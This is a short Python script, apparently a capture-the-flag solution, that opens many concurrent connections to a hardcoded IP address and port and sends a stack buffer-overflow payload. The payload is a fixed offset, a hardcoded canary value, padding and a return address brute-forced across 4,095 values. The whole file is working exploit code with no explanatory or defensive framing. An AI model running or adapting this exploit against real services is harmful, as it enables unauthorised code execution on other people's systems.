import asyncio
import struct

async def send_payload(i):
    try:
        reader, writer = await asyncio.open_connection('34.125.199.248', 5674)

        offset = b'A' * 32
        canary = b'NECGLSPQAA'
        payload = offset + canary
        payload += b'A' * 16 + struct.pack('<I', 0x95f84000 + i)

        writer.write(b'> ')
        await writer.drain()
        writer.write(str(len(payload)).encode())
        await writer.drain()

        writer.write(b'> ')
        await writer.drain()
        writer.write(payload)
        await writer.drain()

        response = await reader.read(300)
        print(response.decode())

        await asyncio.sleep(1)
    except Exception as e:
        print(f"Error: {e}")

async def main():
    tasks = []
    for i in range(0xfff):
        tasks.append(send_payload(i))
    await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(main())
